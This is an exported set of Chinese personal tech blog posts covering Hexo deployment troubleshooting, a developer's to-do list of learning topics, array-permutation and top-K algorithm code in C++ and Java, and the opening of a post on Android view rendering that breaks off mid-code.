[{"title":"Hexo部署个人博客记录","date":"2217-01-08T18:01:01.000Z","path":"2217/01/08/2017-01-08-trouble-shooting-with-my-blog/","text":"使用 hexo 写博客以来，记录下来的问题越来越多。只希望下次再碰到同样的问题时，不要再去浪费时间去查找。如果想要给自己的 blog 一个值得置顶的文章的话，我觉得一篇记录使用 hexo 过程中的一些解决问题的方法的文章是再合适不过的了。 1. 经常更新 yilia 的 themeyilia主题经常会更新，及时更新 theme 会发现很多新的特性及 bug fix 2. 部署相关 部署到 github hexo clean //清除缓存 hexo g -d //一步到位 = hexo g + hexo d hexo s //localost:4000本地预览 部署过程中出现的一些错误 $ hexo g -d INFO Start processing ERROR Process failed: _posts/2016-12-10-adb-command.md YAMLException: can not read a block mapping entry; a multiline key may not be an implicit key at line 3, column 11: categories: [技术] ^ at generateError (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:162:10) at throwError (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:168:9) at readBlockMapping (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1040:9) at composeNode (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1326:12) at readDocument (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1488:3) at loadDocuments (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1544:5) at Object.load (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\js-yaml\\lib\\js-yaml\\loader.js:1561:19) at parseYAML (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-front-matter\\lib\\front_matter.js:80:21) at parse (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-front-matter\\lib\\front_matter.js:56:12) at D:\\Blog\\github\\node_modules\\hexo\\lib\\plugins\\processor\\post.js:52:18 at tryCatcher (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\util.js:16:23) at Promise._settlePromiseFromHandler (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:507:35) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:567:18) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at PromiseArray._resolve (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:125:19) at PromiseArray._promiseFulfilled (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:143:14) at PromiseArray._iterate (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:113:31) at PromiseArray.init [as _init] (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:77:10) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:564:21) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at PromiseArray._resolve (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:125:19) at PromiseArray._promiseFulfilled (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise_array.js:143:14) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:572:26) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at Promise._resolveCallback (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:431:57) at Promise._settlePromiseFromHandler (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:522:17) at Promise._settlePromise (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:567:18) at Promise._settlePromise0 (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:612:10) at Promise._settlePromises (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:691:18) at Promise._fulfill (D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\promise.js:636:18) at D:\\Blog\\github\\node_modules\\hexo\\node_modules\\bluebird\\js\\release\\nodeback.js:42:21 at D:\\Blog\\github\\node_modules\\hexo\\node_modules\\hexo-fs\\node_modules\\graceful-fs\\graceful-fs.js:78:16 at tryToString (fs.js:455:3) at FSReqWrap.readFileAfterClose [as oncomplete] (fs.js:442:12) INFO Files loaded in 1.48 s INFO Generated: sitemap.xml INFO Generated: atom.xml INFO Generated: 2017/01/08/2017-01-08-trouble-shooting-with-my-blog/index.html INFO Generated: index.html INFO 4 files generated in 2.26 s INFO Deploying: git 找了好久，有说”_config.xml” 文件 有空格的，有说 title 被乱改的，试了好长时间，改成这样就不再报错了。所以，冒号后面一定要加空格，英文半角的 --- title: adb常用命令手册 date: 2016-12-10 21:14:14 tags: - android - adb --- tags 有两种写法，一种是上面这样前面加横杠另一种长这样，写成数组形式 --- title: my awesometitle date: 2017-05-07 16:48:01 categories: blog tags: [linux,python] --- 3. 一些功能的实现 置顶功能将 node_modules/hexo-generator-index/lib/generator.js 的文件内容替换成以下内容 &quot;use strict&quot;; var pagination = require(&quot;hexo-pagination&quot;); module.exports = function(locals) { var config = this.config; var posts = locals.posts; posts.data = posts.data.sort(function(a, b) { if (a.top &amp;&amp; b.top) { // 两篇文章top都有定义 if (a.top == b.top) return b.date - a.date; // 若top值一样则按照文章日期降序排 else return b.top - a.top; // 否则按照top值降序排 } else if (a.top &amp;&amp; !b.top) { // 以下是只有一篇文章top有定义，那么将有top的排在前面（这里用异或操作居然不行233） return -1; } else if (!a.top &amp;&amp; b.top) { return 1; } else return b.date - a.date; // 都没定义按照文章日期降序排 }); var paginationDir = config.pagination_dir || &quot;page&quot;; return pagination(&quot;&quot;, posts, { perPage: config.index_generator.per_page, layout: [&quot;index&quot;, &quot;archive&quot;], format: paginationDir + &quot;/%d/&quot;, data: { __index: true } }); }; 同时在文章开头添加 top : 1 即可 ，实际排序按照这个数字从大到小排序 另一种做法是手动将date改大，日期越靠后的越在前面。 title: Hexo置顶文章 date: 2016-11-11 23:26:22 tags:[置顶] categories: Hexo top: 0 # 0或者1 个人建议：置顶不要太多 4. SublimeText 的一些快捷键由于文章大部分都是使用 SublimeText 写的，Typroa 这种所见即所得的编辑器也不错，但对于掌握 MardkDown 语法没有帮助。这里摘录一些 SubLimeText 的快捷键。 Ctrl+Shift+P：打开命令面板Ctrl+P：搜索项目中的文件Ctrl+G：跳转到第几行Ctrl+W：关闭当前打开文件 CTRL+F4 也可以Ctrl+Shift+W：关闭所有打开文件Ctrl+Shift+V：粘贴并格式化Ctrl+D：选择单词，重复可增加选择下一个相同的单词Ctrl+L：选择行，重复可依次增加选择下一行Alt+Shift+数字：分屏显示Ctrl+Shift+L：选择多行Ctrl+Shift+D：复制粘贴当前行Ctrl+X：删除当前行Ctrl+Shift+左箭头 往左边选择内容Shift+向左箭头 向左选择文本Ctrl+B 编译，markDown 生成 html 文件Alt+2 切换到第二个 Tab（打开的文件，记得 chrome 是 ctrl+2）Ctrl+R：前往 对应的方法的实现*快速加上[] 选中单词按 [ 即可批量更改当前页面相同的单词 alt+F3 Ctrl+Enter 在下一行插入新的一行Ctrl+Shift+Enter 在上一行插入新的一行Shift+ 向上箭头 向上选中多行 Ctrl+Shift+D：复制粘贴当前行 Ctrl+Shift+Enter：在当前行前插入新行Ctrl+M：跳转到对应括号Ctrl+U：软撤销，撤销光标位置Ctrl+J：选择标签内容Ctrl+F：查找内容Ctrl+Shift+F：查找并替换Ctrl+H：替换Ctrl+N：新建窗口Ctrl+K+B：开关侧栏Ctrl+Shift+M：选中当前括号内容，重复可选着括号本身Ctrl+F2：设置/删除标记Ctrl+/：注释当前行Ctrl+Shift+/：当前位置插入注释Ctrl+Alt+/：块注释，并 Focus 到首行，写注释说明用的Ctrl+Shift+A：选择当前标签前后，修改标签用的F11：全屏Shift+F11：全屏免打扰模式，只编辑当前文件Alt+F3：选择所有相同Alt+.：闭合标签Shift+右键拖动：光标多不，用来更改或插入列内容Alt+数字：切换打开第 N 个文件鼠标的前进后退键可切换 Tab 文件按 Ctrl，依次点击或选取，可需要编辑的多个位置按 Ctrl+Shift+上下键，可替换行 vscode的快捷键最重要的一个是ctrl+shift+p(相当于sublime里面的命令模式),ctrl+p只是在全局查找文件 5. title 不能以[]开头前面加上###确实能够让字号变大，但不要写 4 个#，后面的字母会大小写不分的 6. markdown 语法MarkDown 页面内部跳转MarkDown 技巧：两种方式实现页内跳转 一个星星包起来是斜体字两个星星包起来是粗体字那么三个星星呢 “—“ 三根横杠是分割线 我是分割线上面我在分割线下面 键盘ESC下面那个键按两下是code的意思 和一个html code tag 同样的效果 彩色的字 0、10、20、30、40 7.github 提交 commit 的时候显示 Emoji链接在此 8.换电脑了怎么办亲测，把整个目录下所有文件全部复制粘贴到新电脑上，装上 node，然后装上 hexo，记得勾选添加到 PATH,然后就可以了。需要注意的是小文件比较多，所以复制粘贴可能要十几分钟。 9. 有时候写的代码会给你在每一行前面加上 true比如写一段 css 的代码时候，很多时候预览会给每一行前面加上一个 true，解决办法：用 TAB 键缩进即可 10. markdown-live 是一个非常好用的 node module项目地址前提是安装了 node npm install -g markdown-live md-live 编辑md文件的同时，保存就会同步刷新网页预览，非常好用 11. 如果运行 hexo g 生成的 index.html 是空的输出 WARN No layout: tags/service/index.html原因是 themes/文件夹下没有 clone 对应的主题 换成travis之后，在travis.yml文件中，添加了 cache: yarn: true directories: - node_modules - themes cahe也就意味着后续，所有对于themes文件夹中的_config.yml文件的修改都不会生效。这也就是我一遍遍尝试更改theme文件夹中_config文件不生效的原因。所以要么去掉cache ，要么自己写bash script一行行的改。 12. markdown写表格直接在atom下面敲table，就会自动提示出来的 一个普通标题 一个普通标题 一个普通标题 短文本 中等文本 稍微长一点的文本 稍微长一点的文本 短文本 中等文本 中间的虚线左边的冒号表示下面的单元格左对齐，冒号放右边就右对齐，左右都放一个就表示居中 vscode的返回上一个文件快捷键是ctrl + - 13 . travis ci自动部署的一些问题travis ci加密文件无法在travis以外的地方解密，因为key,value都存在travis的数据库了 travis加密文件后用openssl解密出现iv undefined的错误 iv undefined travis env listencrypted_476ad15a8e52_key=[secure]encrypted_476ad15a8e52_iv=[secure]明明是存在的 在linux 里面运行travis endpoint果然是 API endpoint: https://api.travis-ci.org/而新的endpoint应该是 https://api.travis-ci.com/于是travis encrypt-file –help –pro short-cut for –api-endpoint ‘https://api.travis-ci.com/‘–org short-cut for –api-endpoint ‘https://api.travis-ci.org/‘ 所以 travis encrypt-file super_secret.txt 应该改成travis encrypt-file super_secret.txt –pro 因为默认的$encrypted_476ad15a8e52_key其实已经存储在travis-ci.org上了所以在travis-ci.com上的项目当然找不到 自动部署的另一个实例 14. hexo server本地预览出现的问题hexo s 本地预览样式加载失败 is not executable, and strict MIME type checking is enabled.) hexo server的意思是类似于express的serve static功能，默认只处理public文件下的文件，所以如果本地运行hexo s 出现404的话，直接copy到public文件夹下就可以了注意hexo clear会删掉public文件夹 [Refused to Execute Script From Because Its MIME Type (Text/plain) Is Not Executable, and Strict MIME Type Checking Is Enabled]这句话的意思,这其实是我本地跑hexo server的时候，没有找到一个xx.js文件，所以express返回了一个类似于404的plain text（而不是js文件），所以就出这个问题了。 15. yilia的主题里面badjs report的问题yilia的主题里面有一个badjs的report，去掉的方法：cd 到themes/yilia里面,rm -rf source/ , 然后把source-src里面的report.js里面的东西删掉。yarn install ,yarn dist ,然后回到上层目录。hexo clean , hexo g就可以了。其实看下里面，就是一个webpack的配置，自己重新编译一下就好了。编译后会在source里面重新生成需要的js文件。奇怪的是在windows上编译失败，在linux上编译失败，在mac上终于成功了。 16. hexo serverenospc的解决方式由于需要监听多个文件，所以linux下允许监听的文件数有个上限，这里修改一下就可以了 17. hexo自带的代码高亮有一些不是很好的地方改用highlightjs就可以了。首先要把最外面的_config.yml里面的高亮关掉 highlight: enable: false 由于最终生成的html文件中引用的是theme中webpack -p 打出来的js文件，所以照着highlightjs的说明修改一下yilia的源码，source-src目录，npm install highlight.js –save重新yarn dist就好了。yilia的theme修改还算简单。 18. hexo渲染md文件时有些特定字符串是不能写的hexo本质上是一个js模板渲染工具，和jinja，handlerbars这一类模板一样，经常会用花括号包起来表示一个变量下面这个，美元符号加一个花括号抱起来的井号就不能单独拿出来写 ${#} 报的错大概长这样 Template render error: (unknown path) [Line 101, Column 142] unexpected token: }} 原因是这种看上去像是引用一个变量的东西是某些js库的保留syntax 参考 Hexo 博文置顶技巧 SublimeText 快捷键 MarkDown 语法学起来很快的 travis 自动部署 Legacy GitHub Services to GitHub Apps Migration Guide 2018年10月1号之后不再支持 Legacy GitHub Service","tags":[{"name":"置顶","slug":"置顶","permalink":"https://haldir65.github.io/tags/置顶/"},{"name":"hexo","slug":"hexo","permalink":"https://haldir65.github.io/tags/hexo/"}]},{"title":"即刻备忘录","date":"2046-12-18T22:58:14.000Z","path":"2046/12/18/2017-12-18-random-new-thoughts/","text":"一个待办事项的仓库 期待能够完成的 个人分享–web 前端学习资源分享 PWA 所代表的 Web 开发应是未来据说Electron要被PWA干掉 js 循环闭包的解决方法 动态类型一时爽，代码重构火葬场 iview，elementUi [ ] shadowsocks-android源码（据说是起了一个c进程守护） [ ] chromium net移植到Android平台cronet是最简单的方式 更多下载仓库 embeed video with iframe [ ] Paul Irish from google [ ] lightbox一个很好看的js图片查看库 [ ] 一个很好看的h5音乐播放器 [ ] 仿门户网站js相册， js相册2 [ ] 八大排序算法的python实现 [ ] Redux和Flux很像,react context api [ ] 一个展示如何在宿主App中提取一个apk文件并加载代码和资源 [ ] nodejs ,go ,protobuf rpc(proto更多的是作为一种协议来进行rpc数据传输) [ ]一致性哈希原理 [ ] 使用redis实现低粒度的分布式锁 [ ] Coordinator behavior以及scroll原理，完善blog [ ] instagram好像通过注解的方式自己写了一个json解析器ig-json-parser [ ] when it comes to design , how do we translate px, pt, em into sp,dp and others(设计方面的，各种单位之间的转换)? [ ] learning how textView works is painful yet necessary [ ] linux环境下多进程通讯方式(管道，共享内存，信号,unix domian socket) [ ] mqtt接入实践mqtt是建立在tcp基础上的应用层协议，netty也做了实现 [ ] play around with xposed [ ] python gui编程 [ ] Kotlin Coroutines Tutorial (STABLE VERSION) [ ] 宇宙第一ide熟悉使用 [ ] js的闭包等面试常谈 [ ] java的aspectJ教程，Spring AOP 与AspectJ 实现原理上并不完全一致，但功能上是相似的 [ ] autoWired, autovalue这些java 的library [ ] code generator(代码生成器) [ ]content-disposition [ ] 用正则检测或者解析json(jQuery源码里有) 在线正则检测网站 [ ] awk，正则表达式还有数据库这些也算一门编程语言 [ ] 来来来，手写一个vm [ ] chromium提供了如何在windows上编译chromium的教程 [ ]How the JVM compiles bytecode into machine code [ ] WebSocket协议及数据帧 [ ]Lua脚本是一个很轻量级的脚本，也是号称性能最高的脚本。路由器上都有运行环境，语法和c语言差不多 腾讯的mmkv是shared preference的有效替代品 mmap的使用值得学习 [ ] openjdk的C语言实现可以随便调几处来看看 简单的组件化方案 mvc,mvp,mvvm这些关键术语的掌握还是必要的 已完成 用 express 转接一个知乎 Api，添加 Access-control-allow-origin,或许还可以用 redis 缓存数据结果（一个就好）由此想到一篇文章”How to use Pythonto build a restful Web Service”.只不过用的是 Tornado git hook (github travis 持续集成，git push 会触发服务器的一系列操作) 基于前后端分离的理念，后台只负责提供数据，render page 的任务应该交给前端。（所以用 express-handlebars 写页面的方式写着很累） 集成 travis-ci，记得 after-success script 的结果并不会影响 build 的结果（即，after-success 执行脚本发生了错误，在日志里有输出 error，但实际显示的 build result 仍为 success），还有 travis 的输出 log 需要默认是折叠的，要展开才能看清楚，但在 afterSuccess 里面的指令的输出一定是有的。 随便放一个文件到/usr/bin/就可以直接调用这个文件名来起这个命令了吗？（实际操作只需要建立一个symbolic link就好了） 单个网卡最多65535个端口，c10K。65536其实不是操作系统限制的，而是tcp协议就只给port留了2个bytes给source port，只留了2个bytes给destination port端口号写在tcp包里，ip地址不是，ip地址是ip层的事情 oAuth2原理，其实流程上和很多客户端的微信登陆，新浪微博登陆很像的 在Android手机上尝试用一个unix domain socket用于localhost进程间ipc(其实就是保证端口号一致，给网络权限就好了) 写 groovy 用intelij全家桶就可以了，groovy的语法其实没什么，主要是了解编译的流程和基本原理，这个需要看official doc 开发gradle plugin优化MultiDex。长远来看，5.0以后的手机越来越多，MultiDex也不值得过于关注。 intelij 点击run 实际调用的command line是两个，一个是javac，编译出来的class文件放到了target文件夹，紧接着用java命令带上一大串classpath去调用主函数 Android Studio 编译过程，其实就是gradle assembleXXX 好了之后adb push到手机上，再安装，最后起主界面 Android 编译及 Dex 过程源码分析 如何调试 Android 打包流程？，一个remote的事 一个用于优化 png 图片的 gradle 插件，用来看 groovy 语法挺好的。以及 How to write gradle plugin XSS 攻击,DOM based和Stored XSS,基本上就是不要相信用户的输入，除了合法输入以外一律过滤掉 websocket nodejs，局限性就是前后台都得用socket.io的库。前端是浏览器的话还好，app的话java,Android都有对应的实现.[其实就是socket io] [X]一直不会maven是在是太丢人了看文档就行了，其他的教程也不错 [使用Spring boot后台提供protobuf接口实现客户端通信] 不要使用protobf-gradle-plugin了。直接写脚本用protoc去生成文件，指定生成文件的路径要和proto里面写的包名对的上。另外就是客户端和server端依赖的protobuf版本以及protoc工具的版本得一致，比如都是3.5。还有就是protoc的语法，什么import的比较烦。 [X] 使用jinja2生成文件。一个比较好玩的代码生成器 [X] URL Encoding,就是那个在网址里把字符转成百分号加上UTF-8的找到了阮一峰老师的解释 [X] 通过file input上传图片，原生ajax以及Ajax，自己搭建上传服务器大概能猜到暴风影音的局域网传输实现了用flask的话自己搭建好后台最简单了，最多再使用flask-wtf和flask-upload规范操作 [X]Promise 链式调用与终止，异常处理(只是一个工具而已) [X] Android 应用接入bugly热修复，上线之后就不用背锅了（有兴趣看看sevenZip.jar，暂时没看） [X] 简直碉堡了的博客以及jvm 的inline等优化 [ ] 如何写makefile其实这个更加friendly [X] libmp3lame移植到Android,该教程针对的lame版本是3.99.5 scheme 这东西算跨客户端平台的，比如在 App 中调起支付宝(用的是 alipayqr://)。其实就是一个系统内跨应用调用。用法这个主要是ios app之间通信的协议，以及快速跳转某个app某个页面的功能实现，还有x-callback-URL这样类似的协议。不过有了3d-touch之后，很多app都能长按图标进入页面，所以url scheme这个功能只能说是不复往日辉煌了 [X]linux的sed命令(文本替换比较常用) nio 还是netty好。也可以看点别的并发编程网 [X]js 的async await,就是一个async修饰一个method，里面随便写await [X] Linux下TCP延迟确认机制 [X]c语言的libevent使用教程 eventloop，添加回调，大致的流程就是这样 [X] indexed DB,浏览器端数据库，还是用第三方库好 [X] block size vs page size Page是内存相关，block是硬盘相关的 [X] python 的asyncio(eventloop , generator, coroutine) [X]Vim cheet sheet vim多用用就熟悉了。 [X] python dunder class复习。知道有python descriptor这回事就行了。 [X] form表单可以跨域一个是历史原因要保持兼容性（就是说跨域这件事，一个域名的 JS ，在未经允许的情况下，不得读取另一个域名的内容。但浏览器并不阻止你向另一个域名发送请求。所以post的表单可以发出去，但是别指望能够拿到response） [X] a new article on open-gl intro(在Android平台上要和MediaCodec相关的音视频格式结合着来一起看) [X] JavaScript中new FileReader(属于html5的东西)，以及canvas api(lineTo,quardTo这些都是相近的),以及js进行图片缩放和裁剪 [X] tcp-proxy实用教程 [X]Exoplayer and the MediaCodec apibuilding-a-video-player-app-in-android AC2016腾讯前端技术大会 1 1 1 H5直播那些事 [X] tcp-proxy实用教程(tcp replay or udp relay) [X] render-script utility [X]C语言fork进程以及进程之间通信的套路 [X] flex,grid. css的box-size真是坑人 [X] rxjava是如何切换线程的以及源码解析，ObserveOnObserver和ObservableSubscribeOn实例是桥梁 Good For Nothing [ ] 用GDB调试程序 [ ] npm install graphql(mostly a server side javascript stuff) 使用 express 模拟网络延迟 基于 Docker 打造前端持续集成开发环境 vS Code Vender Prefix plugin =&gt; auto prefix loader 前后端分离 sql漏洞 深入浅出腾讯云 CDN：缓存篇不管SSD盘或者SATA盘都有最小的操作单位，可能是512B，4KB，8KB。如果读写过程中不进行对齐，底层的硬件或者驱动就需要替应用层来做对齐操作，并将一次读写操作分裂为多次读写操作。 Android进程的加载流程 前后端同构 install nginx , jenkin ci, deploying nginx in docker(Http Load Balaning with Docker and nginx) [ ] 网易云音乐API [X] Django部署个人网站(Gunicorn，Nginx)。django写template就不是前后端分离了 [ ] Dockerintro-to-docker-building-android-app 这篇文章其实是两件事，一个是Build docker image(docker build xxxx),另一个是run (docker run xxx) [ ] 和网页类似，Activity也有一个referer的概念，用于判断当前页面是由谁发起请求的OpenType® is a cross-platform font file format developed jointly by Adobe and Microsoft. [ ]deploying owncloud using docker owncloud官方的配合docker安装教程网盘这种东西看个人喜好了 [ ]CloudFlare cdn解析以及DNS防护 [ ] python c extension [ ] 最简单的一个用go写出来的rest api大概长这样 [ ]分词器 [ ]LOGSTASH+ELASTICSEARCH+KIBANA处理NGINX访问日志ELK全家桶, logstash接管软件日志 [ ] 如何编写 jQuery 插件 netfilter框架(imbedded in linux server) jsonplaceholder懒得自己写api的话就用这个吧 console.log(\"hey there\")","tags":[{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"算法-数组全排列","date":"2019-04-03T13:44:25.000Z","path":"2019/04/03/2019-04-03-algorithm-array-permutation/","text":"问题描述 全排列表示把集合中元素的所有按照一定的顺序排列起来，使用P(n, n) = n!表示n个元素全排列的个数。P(n, n)中的第一个n表示元素的个数，第二个n表示取多少个元素进行排列。比方说[1,2,3]这个数组，全排列就有这6种结果 [1,2,3] [1,3,2] [2,1,3] [2,3,1] [3,1,2] [3,2,1] 给定一个n个元素数组，其全排列的过程可以描述如下：（1）任意取一个元素放在第一个位置，则有n种选择；（2）再剩下的n-1个元素中再取一个元素放在第二个位置则有n-1种选择，此时可以看做对n-1个元素进行全排列；（3）重复第二步，直到对最后一个元素进行全排列，即最后一个元素放在最后一个位置，全排列结束。 以数组{1,2,3}为例，其全排列的过程如下：（1）1后面跟（2,3）的全排列；（2）2后面跟（1,3）的全排列；（3）3后面跟（1,2）的全排列。 递归版本的实现#include &lt;iostream&gt; using namespace std; int sum=0; //全排列个数 //打印数组内容 void print(int array[],int len){ printf(&quot;{&quot;); for(int i=0; i&lt;len;++i) cout&lt;&lt;array[i]&lt;&lt;&quot; &quot;; printf(&quot;}\\n&quot;); } //实现两数交换 void swap(int* o,int i,int j){ int tmp = o[i]; o[i] = o[j]; o[j] = tmp; } //递归实现数组全排列并打印 void permutation(int array[],int len,int index){ if(index==len){//全排列结束 ++sum; print(array,len); } else for(int i=index;i&lt;len;++i){ //将第i个元素交换至当前index下标处 swap(array,index,i); //以递归的方式对剩下元素进行全排列 permutation(array,len,index+1); //将第i个元素交换回原处 swap(array,index,i); } } int main(){ int array[3]={1,2,3}; permutation(array,3,0); cout&lt;&lt;&quot;sum:&quot;&lt;&lt;sum&lt;&lt;endl; getchar(); } 考虑数组元素中有重复的元素对于[1,2,2]这种数组，把第一个数1和第二个数2互换得到[2,1,2],接下来第一个数1与第三个数2互换就没有必要了。再考虑[2,1,2]，第二个数与第三个数互换得到[2,2,1],至此全排列结束。 这样我们也得到了在全排列中去掉重复的规则——去重的全排列就是从第一个数字起每个数分别与它后面非重复出现的数字交换。 修改代码如下: //是否交换 bool isSwap(int array[],int len,int index){ for(int i=index+1;i&lt;len;++i)//从这个index开始，往后一旦出现了和该数字重复的，不用互换了 if(array[index]==array[i]) return false; return true; } //递归实现有重复元素的数组全排列 void permutation(int array[],int len,int index){ if(index==len){//全排列结束 ++sum; print(array,len); //如果只有一个的话，那必然已是全排列完成了的 } else for(int i=index;i&lt;len;++i){ if(isSwap(array,len,i)){ //新增判断是否交换 //将第i个元素交换至当前index下标处 swap(array,index,i); //以递归的方式对剩下元素进行全排列 permutation(array,len,index+1);//固定当前的首位元素，递归求剩下的全排列种类 //将第i个元素交换回原处 swap(array,index,i); } } } 参考数组的全排列","tags":[{"name":"算法","slug":"算法","permalink":"https://haldir65.github.io/tags/算法/"}]},{"title":"算法-Top-K问题","date":"2019-03-30T22:17:37.000Z","path":"2019/03/30/2019-03-30-algorithm-top-K/","text":"10亿个数中找出最大的10000个数（top K问题） 1. 直接排序然后取最大的K个数总的时间复杂度为O(NlogN)+O(K)=O(NlogN)。该算法存在以下问题： 快速排序的平均复杂度为O(N*logN)，但最坏时间复杂度为O(n2)，不能始终保证较好的复杂度只需要前k大或k小的数,，实际对其余不需要的数也进行了排序，浪费了大量排序时间 2. 利用快速排序的特点在数组中随机找一个元素key，将数组分成两部分Sa和Sb，其中Sa的元素&gt;=key，Sb的元素&lt;key 若Sa中元素的个数大于或等于k，则在Sa中查找最大的k个数若Sa中元素的个数小于k，其个数为len，则在Sb中查找k-len个数字 public static int findTopK(int[] array, int left, int right, int k) { int index = -1; if (left &lt; right) { int pos = partition(array, left, right); int len = pos - left + 1; if (len == k) { index = pos; } else if (len &lt; k) {//Sa中元素个数小于K，到Sb中查找k-len个数字 index = findTopK(array, pos + 1, right, k - len); } else {//Sa中元素的个数大于或等于k index = findTopK(array, left, pos - 1, k); } } return index; } /** * 按基准点划分数组，左边的元素大于基准点，右边的元素小于基准点 * * @param array * @param left * @param right * @return */ public static int partition(int[] array, int left, int right) { int x = array[left];//基准点，随机选择 do { while (array[right] &lt; x &amp;&amp; left &lt; right)//从后向前扫描，找到第一个比基准点大的元素 right--; if (left &lt; right) { array[left] = array[right];//大元素前移 left++; } while (array[left] &gt;= x &amp;&amp; left &lt; right) //从前向后扫描，找到第一个比基准点小的元素 left++; if (left &lt; right) { array[right] = array[left];//小元素后移 right--; } } while (left &lt; right); array[left] = x; return left; } 3. 小顶堆堆排序在处理海量数据的时候十分有效查找最大的K个数，其实就是建立一个大小为K的小顶堆，每次出现比顶部大的元素时，替换，并重新调整堆代码实现如下下面这个是找出最小的K个元素，并且是构建大顶堆 public static int[] findTopK(int[] array, int k) { int heapArray[] = new int[k]; for (int i = 0; i &lt; k; i++) { heapArray[i] = array[i]; } buildMaxHeap(heapArray); for (int i = k; i &lt; array.length; i++) { if (array[i] &lt; heapArray[0]) { heapArray[0] = array[i];//更新堆顶 adjustMaxHeap(heapArray, 0, heapArray.length); } } return heapArray; } /** * 构建小顶堆 * * @param array */ public static void buildMaxHeap(int[] array) { for (int i = array.length / 2 - 1; i &gt;= 0; i--) { adjustMaxHeap(array, i, array.length); } } /** * 调整堆结构 * * @param array * @param root 根节点 * @param length */ public static void adjustMaxHeap(int[] array, int root, int length) { int left = root * 2 + 1; //左节点下标，数组下标从0开始，所以加1 int right = left + 1; //右节点下标 int largest = root;// 存放三个节点中最大节点的下标 if (left &lt; length &amp;&amp; array[left] &gt; array[root]) { //左节点大于根节点，更新最大节点的下标 largest = left; } if (right &lt; length &amp;&amp; array[right] &gt; array[largest]) {//右节点大于根节点，最大节点的下标 largest = right; } if (root != largest) { swap(array, largest, root); adjustMaxHeap(array, largest, length); } } /** * 交换 * * @param arr * @param i * @param j */ public static void swap(int[] arr, int i, int j) { int temp = arr[i]; arr[i] = arr[j]; arr[j] = temp; } 算法的时间复杂度为O(N * logk) 4. 假如数据的最大值和最小值差距不大，都是整数的话，可以考虑申请一个数组，存放每个元素出现的次数，结束后对这个数组从后往前统计，碰到count大于0的说明出现过，统计到了K个就结束public static List&lt;Integer&gt; findTopK(int[] array, int k) { int max = array[0]; for (int i = 0; i &lt; array.length; i++) { if (max &lt; array[i]) { max = array[i]; } } int count[] = new int[max + 1]; for (int i = 0; i &lt; array.length; i++) { count[array[i]] += 1; } List&lt;Integer&gt; topKList = new ArrayList&lt;&gt;(); for (int sumCount = 0, j = count.length - 1; j &gt;= 0; j--) { int c = count[j]; sumCount += c; if (c &gt; 0) { for (int i = 0; i &lt; c; i++) { topKList.add(j); } } if (sumCount &gt;= k) { break; } } return topKList; } 该算法还可以用bitmap算法优化，用一个int表示32个整数。","tags":[{"name":"算法","slug":"算法","permalink":"https://haldir65.github.io/tags/算法/"}]},{"title":"从setContentView开始谈的渲染流程","date":"2019-03-29T09:25:01.000Z","path":"2019/03/29/2019-03-29-from-setcontentview-to-rendering/","text":"谈一谈View的渲染流程吧 Activity不负责控制视图，它主要控制生命周期和处理事件。Activity中通过持有PhoneWindow来控制视图,而事件则是通过WindowCallback来传达给Activity的Window（唯一实现类是PhoneWindow）。PhoneWindow是在activity的attach中new出来的，并且设置了PhoneWindow.setCallback(this)。大致代码如下 //activity.java final void attach(Context context, ActivityThread aThread, Instrumentation instr, IBinder 